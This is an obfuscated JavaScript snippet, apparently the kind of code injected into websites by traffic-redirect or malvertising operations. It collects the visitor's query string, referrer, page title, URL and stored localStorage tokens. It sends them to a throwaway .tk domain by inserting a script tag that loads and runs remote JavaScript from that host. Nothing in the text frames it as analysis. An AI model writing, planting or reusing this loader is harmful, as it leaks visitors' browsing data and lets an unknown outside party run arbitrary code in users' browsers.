(function() {
    var name = '_swqmtXtbPHvqJn8Q';
    if (!window._swqmtXtbPHvqJn8Q) {
        window._swqmtXtbPHvqJn8Q = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://whiranjafusboooo.tk/8yxJYV',
            P_PATH: 'https://whiranjafusboooo.tk/fec84ce/postback',
        };
    }
    const _PyPkwMxyxGtdYqgc = localStorage.getItem('config');
    if (typeof _PyPkwMxyxGtdYqgc !== 'undefined' && _PyPkwMxyxGtdYqgc !== null) {
        var _ByMLtg7yTD627L5H = JSON.parse(_PyPkwMxyxGtdYqgc);
        var _P3T87NDw2DLjFcCd = Math.round(+new Date()/1000);
        if (_ByMLtg7yTD627L5H.created_at + window._swqmtXtbPHvqJn8Q.ttl < _P3T87NDw2DLjFcCd) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _83xDy7PqbsQS89tw = localStorage.getItem('subId');
    var _5qNvDKXsxs3fnzNK = localStorage.getItem('token');
    var _pWSCW43tph9Ghhfn = '?return=js.client';
        _pWSCW43tph9Ghhfn += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _pWSCW43tph9Ghhfn += '&se_referrer=' + encodeURIComponent(document.referrer);
        _pWSCW43tph9Ghhfn += '&default_keyword=' + encodeURIComponent(document.title);
        _pWSCW43tph9Ghhfn += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _pWSCW43tph9Ghhfn += '&name=' + encodeURIComponent(name);
        _pWSCW43tph9Ghhfn += '&host=' + encodeURIComponent(window._swqmtXtbPHvqJn8Q.R_PATH);
    if (typeof _83xDy7PqbsQS89tw !== 'undefined' && _83xDy7PqbsQS89tw && window._swqmtXtbPHvqJn8Q.unique) {
        _pWSCW43tph9Ghhfn += '&sub_id=' + encodeURIComponent(_83xDy7PqbsQS89tw);
    }
    if (typeof _5qNvDKXsxs3fnzNK !== 'undefined' && _5qNvDKXsxs3fnzNK && window._swqmtXtbPHvqJn8Q.unique) {
        _pWSCW43tph9Ghhfn += '&token=' + encodeURIComponent(_5qNvDKXsxs3fnzNK);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._swqmtXtbPHvqJn8Q.R_PATH + _pWSCW43tph9Ghhfn;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
